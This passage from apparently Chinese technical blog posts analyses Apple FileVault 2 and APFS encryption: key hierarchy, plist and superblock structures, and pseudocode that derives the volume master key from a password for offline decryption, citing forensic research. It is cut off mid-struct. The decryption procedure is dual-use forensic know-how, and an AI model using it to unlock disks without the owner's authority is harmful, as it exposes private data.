功能，宗卷加密密钥仅由安全隔区中的硬件 UID 保护<br> <img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/filevault-off.png\" alt=\"SKP\"></li>\n<li>如果稍后启用了文件保险箱 (由于数据已加密，该过程可快速完成)，反重放机制会帮助阻止旧密钥 (仅基于硬件 UID) 被用于解密宗卷，然后宗卷将受用户密码和硬件 UID 共同保护</li>\n</ul>\n</li>\n<li>在 macOS 10.15 Catalina中，这是第一个仅支持 64 位应用程序的 macOS 版本！引入了 Bootstrap Token 功能，也就是为密钥层级增加了 SKP 保护层，并为后续签名系统卷宗 SSV 提供了技术基础。</li>\n<li>在 macOS 11 Big Sur 中，系统宗卷通过签名系统宗卷 SSV 功能进行保护（实际上仅提供操作系统的快照），而数据宗卷仍通过加密进行保护。</li>\n</ul>\n<h3 id=\"2-KEK的多副本\"><a href=\"#2-KEK的多副本\" class=\"headerlink\" title=\"2. KEK的多副本\"></a>2. KEK的多副本</h3><p>Apple公司定义了几种获得 KEK 的方式：</p>\n<ul>\n<li>用户口令（User password）：系统登录时用户输入口令。为保证必要的安全强度，系统实际使用的密钥必须经过密钥拉伸</li>\n<li>个人恢复密钥（Personal recovery key）：在格式化驱动器时生成的，并由用户保存在纸上或打印输出，系统或厂商并不留存</li>\n<li>机构恢复密钥（Institutional recovery key）：允许相应的公司获得 KEK，需要用户设置后生效，或者厂商偷偷强制设置！</li>\n<li>远程恢复密钥（iCloud recovery key）：用户在Apple公司的远程支持下进行系统恢复</li>\n</ul>\n<p>为支持不同的场景，keyBag 将同时存储多个 KEK 的副本，例如用户口令采用密钥包裹方式存储，而 iCloud 恢复密钥采用非对称的公钥加密存储，不同场景使用不同的包裹密钥，这也体现了多层级密钥管理的价值所在。</p>\n<h2 id=\"五、FileValut-2-的解密代码实例\"><a href=\"#五、FileValut-2-的解密代码实例\" class=\"headerlink\" title=\"五、FileValut 2 的解密代码实例\"></a>五、FileValut 2 的解密代码实例</h2><p>根据<a href=\"2012-374.pdf\">Infiltrate the Vault: Security Analysis and Decryption of Lion Full Disk Encryption - Omar Choudary</a>，密钥层次如下图。<br>参考<a href=\"https://github.com/libyal/libfvde/blob/main/documentation/FileVault%20Drive%20Encryption%20(FVDE).asciidoc\">FVDE工具包</a>，可以查看实现代码。</p>\n<p><img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/arch.png\" alt=\"密钥层次架构\"></p>\n<h3 id=\"1-CoreStorage-Header\"><a href=\"#1-CoreStorage-Header\" class=\"headerlink\" title=\"1. CoreStorage Header\"></a>1. CoreStorage Header</h3><p>在 CoreStorage 加密卷的 Header，存储了核心的加密信息，包括：卷头部签名、块大小、卷大小、元数据大小、第一个元数据块块号、第二个元数据块块号、第三个元数据块块号、第四个元数据块块号、加密方法、Physical Volume UUID（用于解密加密的密钥文件）、Logiccal Volume Group UUID 等。<br><img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/CS-Header.png\" alt=\"CS\"></p>\n<h3 id=\"2-EncryptedRoot-plist\"><a href=\"#2-EncryptedRoot-plist\" class=\"headerlink\" title=\"2. EncryptedRoot.plist\"></a>2. EncryptedRoot.plist</h3><p>在恢复数据卷 Recovery HD，有一个加密文件包含了提取 VMK 所需的全部信息，路径是：<code>com.apple.boot.X/System/Library/Caches/com.apple.corestorage/EncryptedRoot.plist.wipekey</code><br>这个文件本身也是基于 AES-XTS 加密的，分组密钥就是 CoreStorage 头部存储的<code>AES-XTS key1</code>，可调整密钥是 128 位的全零，解密成功后的内容实例：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">plist</span> <span class=\"keyword\">PUBLIC</span> <span class=\"string\">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class=\"string\">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">plist</span> <span class=\"attr\">version</span>=<span class=\"string\">&quot;1.0&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dict</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>ConversionInfo<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">dict</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>ConversionStatus<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">string</span>&gt;</span>Complete<span class=\"tag\">&lt;/<span class=\"name\">string</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>TargetContext<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">integer</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">integer</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">dict</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>CryptoUsers<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">array</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">dict</span>&gt;</span></span><br><span class=\"line\">                        ...</span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>PassphraseWrappedKEKStruct<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">data</span>&gt;</span></span><br><span class=\"line\">                        ...</span><br><span class=\"line\">                        <span class=\"tag\">&lt;/<span class=\"name\">data</span>&gt;</span></span><br><span class=\"line\">                        ...</span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">dict</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">dict</span>&gt;</span></span><br><span class=\"line\">                ...</span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">dict</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">array</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>LastUpdateTime<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">integer</span>&gt;</span>1323243315<span class=\"tag\">&lt;/<span class=\"name\">integer</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>WrappedVolumeKeys<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">array</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">dict</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>BlockAlgorithm<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">string</span>&gt;</span>None<span class=\"tag\">&lt;/<span class=\"name\">string</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>KEKWrappedVolumeKeyStruct<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">data</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;/<span class=\"name\">data</span>&gt;</span></span><br><span class=\"line\">                        ...</span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">dict</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">dict</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>BlockAlgorithm<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">string</span>&gt;</span>AES-XTS<span class=\"tag\">&lt;/<span class=\"name\">string</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>KEKWrappedVolumeKeyStruct<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">data</span>&gt;</span></span><br><span class=\"line\">                        ...</span><br><span class=\"line\">                        <span class=\"tag\">&lt;/<span class=\"name\">data</span>&gt;</span></span><br><span class=\"line\">                        ...</span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">dict</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">array</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dict</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">plist</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-Volume-Master-Key\"><a href=\"#3-Volume-Master-Key\" class=\"headerlink\" title=\"3. Volume Master Key\"></a>3. Volume Master Key</h3><p>解密后的 plist 文件是一个 XML 文件，其中的关键字段如下，注意实际存储格式是 base64 编码：</p>\n<h4 id=\"PassphraseWrappedKEKStruct\"><a href=\"#PassphraseWrappedKEKStruct\" class=\"headerlink\" title=\"PassphraseWrappedKEKStruct\"></a>PassphraseWrappedKEKStruct</h4><p>KEK（Key Encryption Key，密钥保护密钥）的构造体：AES包裹的KEK，PBKDF2算法的盐。<br>包含了 2 个 284 位 的数据块，分别用于 recovery password 和 user password。</p>\n<p><img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/CS3.png\" alt=\"CS3\"></p>\n<blockquote>\n<p>注意！MacOS 的每个用户都有其自己关联的 PassphraseWrappedKEKStruct<br>APFS 称之为 VEK（Volume Encryption Key）</p>\n</blockquote>\n<h4 id=\"KEKWrappedVolumeKeyStruct\"><a href=\"#KEKWrappedVolumeKeyStruct\" class=\"headerlink\" title=\"KEKWrappedVolumeKeyStruct\"></a>KEKWrappedVolumeKeyStruct</h4><p>VMK（Volume Master Key，卷宗主密钥）的构造体。<br>数组有多个成员，其中标记为<code>AES-XTS</code>的就是 KEK 包裹的 VMK。<br><img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/CS2.png\" alt=\"CS2\"></p>\n<h4 id=\"KeyWrappedKEK\"><a href=\"#KeyWrappedKEK\" class=\"headerlink\" title=\"KeyWrappedKEK\"></a>KeyWrappedKEK</h4><p>如果用户开启了 icloud 远程备份，plist 文件将包含该字段，其数据块结构如下：<br><img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/CS4.png\" alt=\"CS4\"></p>\n<blockquote>\n<p>注意！icloud 恢复是另一个基于非对称密钥算法 RSA 封装的 KEK</p>\n</blockquote>\n<h4 id=\"伪代码实例\"><a href=\"#伪代码实例\" class=\"headerlink\" title=\"伪代码实例\"></a>伪代码实例</h4><p>无论基于 recovery password，还是 user password，都需要通过 PBKDF2 算法进行密钥拉伸。</p>\n<blockquote>\n<p>注意！recovery password 是字符串格式，包括数字之间的破折号。</p>\n</blockquote>\n<p><img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/VMK.png\" alt=\"VMK\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">p = get_user_password()</span><br><span class=\"line\">salt = get_salt_from_PassphraseWrappedKEK()</span><br><span class=\"line\">iterations = <span class=\"number\">41000</span></span><br><span class=\"line\">pk = pbkdf2(p, salt, iterations, HMAC-SHA256)</span><br><span class=\"line\">kek_wrapped = get_kek_from_PassphraseWrappedKEK()</span><br><span class=\"line\">kek = aes_unwrap(kek_wrapped, pk)</span><br><span class=\"line\">vmk_wrapped = get_vmk_from_KEKWrappedVolumeKey()</span><br><span class=\"line\">vmk = aes_unwrap(vmk_wrapped, kek)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-Volume-Tweak-Key\"><a href=\"#4-Volume-Tweak-Key\" class=\"headerlink\" title=\"4. Volume Tweak Key\"></a>4. Volume Tweak Key</h3><p>用户数据 AES-XTS 加密模式的 tweak key 也是128位，构造方式是：$trunc_{128}(SHA256(VolumeMasterKey || LogicVolumeFamilyIdentifier))$</p>\n<p>上个流程已经找到 VMK，那么如何找到 LV Family UUID 呢？</p>\n<ul>\n<li>在 CoreStorage Header 中，第104字节提供了字节偏移量，就是 Disk Label Metadata 的存储位置</li>\n<li>在 Disk Label 中，第220字节提供了字节偏移量，就是 Encrypted Metadata 的存储位置<br>  即：$offset &#x3D; DiskLabel[DiskLabel[220] +32]$</li>\n<li>Encrypted Metadata 基于 AES-XTS 加密，分组密钥也是 CoreStorage Header 的 AES-XTS Key1，可调整密钥是 CoreStorage Header 的 PV UUID</li>\n<li>解密后的 Encrypted Metadata，第280字节提供了字节偏移量，就是 XML Metadata 的存储位置<br>  <img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/CS6.png\" alt=\"CS6\"></li>\n<li>有3个 XML 文件，包含了许多UUID，其中第1和第3个 XML 文件包含了 Logical Volume Family UUID，就是下图中蓝色字段<br>  <img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/CS7.png\" alt=\"CS7\"></li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://fahrplan.events.ccc.de/congress/2006/Fahrplan/attachments/1244-23C3VileFault.pdf\">Legacy FileVault 漏洞报告</a></li>\n<li><a href=\"https://blog.fosketts.net/2011/08/04/mac-osx-lion-corestorage-volume-manager/\">MacOS X 的 Corestorage 逻辑卷组管理器 - Stephen Foskett</a></li>\n<li><a href=\"https://github.com/drduh/macOS-Security-and-Privacy-Guide/blob/master/README-cn.md\">MacOS 的安全和隐私指南</a></li>\n<li><a href=\"https://bombich.com/kb/ccc5/working-apfs-volume-groups\">Working with APFS Volume Groups</a></li>\n<li><a href=\"https://www.jianshu.com/p/c401d546cebf\">APFS 科普贴</a></li>\n<li><a href=\"https://www.ntfs.com/apfs-structure.htm\">APFS Structure</a></li>\n<li><a href=\"https://eclecticlight.co/2021/01/14/m1-macs-radically-change-boot-and-recovery/\">M1 Macs radically change boot and recovery</a></li>\n<li><a href=\"https://sspai.com/post/64301\">Mac 迁移指南：换新机后的任务清单</a></li>\n<li><a href=\"https://github.com/libyal/libfvde/blob/main/documentation/FileVault%20Drive%20Encryption%20(FVDE).asciidoc\">FileVault Drive Encryption 代码库 - Github</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"FileVault2%E5%8A%A0%E5%AF%86%E5%88%86%E5%8C%BA%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%85%B6%E5%8F%96%E8%AF%81%E5%BA%94%E7%94%A8_%E8%93%9D%E6%9C%9D%E7%A5%A5.pdf\">FileVault2加密分区离线解密技术及其取证应用 - 蓝朝祥</a></li>\n<li><a href=\"slides_fv2_ifip_2013.pdf\">Security Analysis and Decryption of FileVault 2 - Omar Choudary</a></li>\n<li><a href=\"2012-374.pdf\">Infiltrate the Vault: Security Analysis and Decryption of Lion Full Disk Encryption - Omar Choudary</a></li>\n<li><a href=\"Apple-File-System-Reference.pdf\">APFS技术白皮书</a></li>\n</ul>\n"},{"title":"Apple File System的软件加密分析","url":"/2024/02/11/Apple-File-System%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/","content":"<p>AFPS（Apple File System）是 Apple 平台上使用的默认文件格式。APFS 继承自 HFS+，因此其设计的某些方面有意遵循 HFS+ 以便于历史数据的迁移。</p>\n<p>Apple File System 支持对容器、卷和文件使用的数据结构进行加密。当一个卷被加密时，它的文件系统树和该卷中的文件内容都被加密。根据设备的能力，苹果文件系统使用硬件或软件加密：</p>\n<ul>\n<li>硬件加密：用于支持硬件加密的设备的内部存储，包括macOS(带T2安全芯片)和iOS设备。<br>  当使用硬件加密时，只有内核（安全隔区）可以与内部存储交互。<br>  既支持 FDE 单密钥模式，也支持 FBE 多密钥模式。</li>\n<li>软件加密：用于外部存储（U盘或外接硬盘），以及不支持硬件加密的设备（Intel CPU的Macbook）上的内部存储。<br>  当使用软件加密时，<strong>仅支持 FDE 单密钥模式</strong>。</li>\n</ul>\n<p>大多数应用程序可以使用 Apple 提供的高级接口与文件系统交互，无需自行处理加密和解密，但为了支持跨操作系统的应用（如磁盘备份恢复、Linux系统读取APFS磁盘数据），Apple 提供了<a href=\"Apple-File-System-Reference.pdf\">Apple File System Reference</a>，公开了技术实现细节，开发者可以自行实现加密和解密处理。</p>\n<h2 id=\"一、总体架构\"><a href=\"#一、总体架构\" class=\"headerlink\" title=\"一、总体架构\"></a>一、总体架构</h2><p>APFS 在概念上分为两层，容器层（Container Layer）和文件系统层（Filesystem Layer）。<br><img src=\"/2024/02/11/Apple-File-System%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/arch.png\" alt=\"ARCG\"></p>\n<h3 id=\"1-容器层-Container-Layer\"><a href=\"#1-容器层-Container-Layer\" class=\"headerlink\" title=\"1. 容器层 - Container Layer\"></a>1. 容器层 - Container Layer</h3><p>一个 APFS 分区有一个单独的容器，容器可以包含多个 volume（也称为 filesystem），每个卷都包含一个目录结构，用于管理 file 和 folder。</p>\n<p><img src=\"/2024/02/11/Apple-File-System%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/level0.png\" alt=\"L0\"></p>\n<ul>\n<li>Superblock：一个容器有多个超级块的副本，这些副本保存了容器在过去时间点的状态。Block 0 通常是最新的副本，用于在挂载过程中查找检查点。</li>\n<li>Checkpoint：建立崩溃保护机制，每个事务结束时将临时对象写入磁盘并存储超级块的副本</li>\n<li>Space manager：跟踪容器内的可用空间，并用于分配和释放存储对象和文件数据的块</li>\n<li>OMAP（Object Map）：基于B-树管理虚拟对象标识符和事务标识符的物理地址映射</li>\n<li>Reaper：一种允许在跨越多个事务的时间段内删除大型对象的机制，单一容器内唯一实例</li>\n</ul>\n<h4 id=\"Container-Superblock\"><a href=\"#Container-Superblock\" class=\"headerlink\" title=\"Container Superblock\"></a>Container Superblock</h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nx_superblock</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">obj_phys_t</span> nx_o; </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nx_magic;                      <span class=\"comment\">// magic ‘NXSB’</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nx_block_size;                 <span class=\"comment\">// 容器的已使用的逻辑块数量</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> nx_block_count;                <span class=\"comment\">// 容器的逻辑块总数</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> nx_features;                   <span class=\"comment\">// 标记位，0x00000004 = NX_CRYPTO_SW，软件加密</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> nx_readonly_compatible_features; </span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> nx_incompatible_features; </span><br><span class=\"line\">    <span class=\"type\">uuid_t</span> nx_uuid;                         <span class=\"comment\">// 容器 UUID</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span> nx_next_oid;                      <span class=\"comment\">// 下一个要使用的 oid</span></span><br><span class=\"line\">    <span class=\"type\">xid_t</span> nx_next_xid;                      <span class=\"comment\">// 下一个要使用的 xid</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nx_xp_desc_blocks; </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nx_xp_data_blocks; </span><br><span class=\"line\">    <span class=\"type\">paddr_t</span> nx_xp_desc_base; </span><br><span class=\"line\">    <span class=\"type\">paddr_t</span> nx_xp_data_base; </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nx_xp_desc_next; </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nx_xp_data_next; </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nx_xp_desc_index; </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nx_xp_desc_len; </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nx_xp_data_index; </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nx_xp_data_len; </span><br><span class=\"line\">    <span class=\"type\">oid_t</span> nx_spaceman_oid;                  <span class=\"comment\">// 空间管理器（临时对象） 的 oid</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span> nx_omap_oid;                      <span class=\"comment\">// 对象映射（物理对象）的 oid</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span> nx_reaper_oid;                    <span class=\"comment\">// 收割机（临时对象）的 oid</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nx_test_type; </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nx_max_file_systems; </span><br><span class=\"line\">    <span class=\"type\">oid_t</span> nx_fs_oid[NX_MAX_FILE_SYSTEMS];   <span class=\"comment\">// Filesystem superblock （虚拟对象）oid 数组</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> nx_counters[NX_NUM_COUNTERS]; </span><br><span class=\"line\">    <span class=\"type\">prange_t</span> nx_blocked_out_prange; </span><br><span class=\"line\">    <span class=\"type\">oid_t</span> nx_evict_mapping_tree_oid; </span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> nx_flags; </span><br><span class=\"line\">    <span class=\"type\">paddr_t</span> nx_efi_jumpstart; </span><br><span class=\"line\">    <span class=\"type\">uuid_t</span> nx_fusion_uuid; </span><br><span class=\"line\">    <span class=\"type\">prange_t</span> nx_keylocker;                  <span class=\"comment\">// 指向容器密钥包的物理位置</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> nx_ephemeral_info[NX_EPH_INFO_COUNT]; </span><br><span class=\"line\">    <span class=\"type\">oid_t</span> nx_test_oid; </span><br><span class=\"line\">    <span class=\"type\">oid_t</span> nx_fusion_mt_oid; </span><br><span class=\"line\">    <span class=\"type\">oid_t</span> nx_fusion_wbc_oid; </span><br><span class=\"line\">    <span class=\"type\">prange_t</span> nx_fusion_wbc; </span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> nx_newest_mounted_version; </span><br><span class=\"line\">    <span class=\"type\">prange_t</span> nx_mkb_locker;                 <span class=\"comment\">// Wrapped media key</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-卷宗层-Volume-Layer\"><a href=\"#2-卷宗层-Volume-Layer\" class=\"headerlink\" title=\"2. 卷宗层 - Volume Layer\"></a>2. 卷宗层 - Volume Layer</h3><p>Volume 是真正存储数据的，每个卷宗都有一个文件系统，核心组件包括：</p>\n<ul>\n<li>Superblock：负责管理 volume 自己的一些配置信息，包含了各个组件的入口</li>\n<li>Root Directory：负责以 B-树 方式存储文件结构信息，如目录结构、文件元数据和文件内容</li>\n<li>OMAP：卷宗的大部分数据都是基于对象存储，因此每个卷宗都需要自己管理 OMAP</li>\n<li>SNAP META Tree：负责管理快照的元数据，也是一个 B-树</li>\n<li>Extentref Tree：负责管理快照扩展数据，还是一个 B-树</li>\n</ul>\n<h4 id=\"Volume-Superblock\"><a href=\"#Volume-Superblock\" class=\"headerlink\" title=\"Volume Superblock\"></a>Volume Superblock</h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">apfs_superblock</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">obj_phys_t</span>  apfs_o;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> apfs_magic;                <span class=\"comment\">// magic &#x27;BSPA&#x27;</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> apfs_fs_index;             <span class=\"comment\">// container Superblock 的 nx_fs_oid 数组的序号</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_features;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_readonly_compatible_features;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_incompatible_features;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_unmount_time;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_fs_reserve_block_count;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_fs_quota_block_count;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_fs_alloc_count;</span><br><span class=\"line\">    <span class=\"type\">wrapped_meta_crypto_state_t</span> apfs_meta_crypto;   <span class=\"comment\">// 仅有密钥版本信息，因为VEK在密钥包！</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> apfs_root_tree_type;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> apfs_extentref_tree_type;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> apfs_snap_meta_tree_type;</span><br><span class=\"line\">    <span class=\"type\">oid_t</span> apfs_omap_oid;                <span class=\"comment\">// 对象映射（物理对象）oid</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span> apfs_root_tree_oid;           <span class=\"comment\">// Root 文件系统树（虚拟对象）oid</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span> apfs_extentref_tree_oid;      <span class=\"comment\">// ？扩展参考树（物理对象）的 oid </span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span> apfs_snap_meta_tree_oid;      <span class=\"comment\">// 快照元数据树（物理对象）的 oid</span></span><br><span class=\"line\">    <span class=\"type\">xid_t</span> apfs_revert_to_xid;           <span class=\"comment\">// 将要恢复到快照的 xid</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span> apfs_revert_to_sblock_oid;    <span class=\"comment\">// 将要恢复到快照的超级块副本的 oid</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_next_obj_id;          <span class=\"comment\">// 下一个要分配的对象 oid</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_num_files;            <span class=\"comment\">// 此卷宗的普通文件总数</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_num_directories;      <span class=\"comment\">// 此卷宗的目录总数</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_num_symlinks;         <span class=\"comment\">// 此卷宗的符号链接件总数</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_num_other_fsobjects;  <span class=\"comment\">// 此卷宗的其他类型文件总数</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_num_snapshots;        <span class=\"comment\">// 此卷宗的快照件总数</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_total_blocks_alloced;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_total_blocks_freed;</span><br><span class=\"line\">    <span class=\"type\">uuid_t</span> apfs_vol_uuid;               <span class=\"comment\">// Volume UUID</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_last_mod_time;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_fs_flags;             <span class=\"comment\">// Flag定义，必须是 APFS_FS_ONEKEY</span></span><br><span class=\"line\">    <span class=\"type\">apfs_modified_by_t</span> apfs_formatted_by;</span><br><span class=\"line\">    <span class=\"type\">apfs_modified_by_t</span> apfs_modified_by[APFS_MAX_HIST];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> apfs_volname[APFS_VOLNAME_LEN];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> apfs_next_doc_id;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> apfs_role;                 <span class=\"comment\">// volume角色，定义见下</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> reserved;</span><br><span class=\"line\">    <span class=\"type\">xid_t</span> apfs_root_to_xid;             <span class=\"comment\">// 快照的事务标识符，通常为零</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span> apfs_er_state_oid;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_cloneinfo_id_epoch;   <span class=\"comment\">// MacOS 10.13.3 之后，用于卷宗克隆</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> apfs_cloneinfo_xid;</span><br><span class=\"line\">    <span class=\"type\">oid_t</span> apfs_snap_meta_ext_oid;       <span class=\"comment\">// 快照元数据扩展（虚拟对象）的 